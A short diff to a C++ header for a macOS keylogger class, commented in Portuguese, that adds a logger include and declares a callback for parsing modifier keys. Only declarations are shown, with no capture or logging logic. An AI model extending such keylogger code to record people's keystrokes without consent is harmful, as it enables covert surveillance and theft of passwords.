@@ -3,6 +3,7 @@
 
 #include <fstream>
 #include <CoreGraphics/CoreGraphics.h>
+#include "KSVLogger.h"
 
 /**
  * Classe Keylogger, observa e registra eventos de INPUT em Teclado e Mouse.
@@ -33,6 +34,8 @@ public:
     // Callback para eventos de mouse
     static CGEventRef CGMouseClickEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon);
 
+    // Analísa grupo de teclas modificadoras
+    static void CGKeyboardModifierInputEventCallback(CGEventType type, CGEventRef event, const char *parsedKey, int keyCode, Logger *logger);
 };
 
 #endif //KSV_KEYLOGGER_H
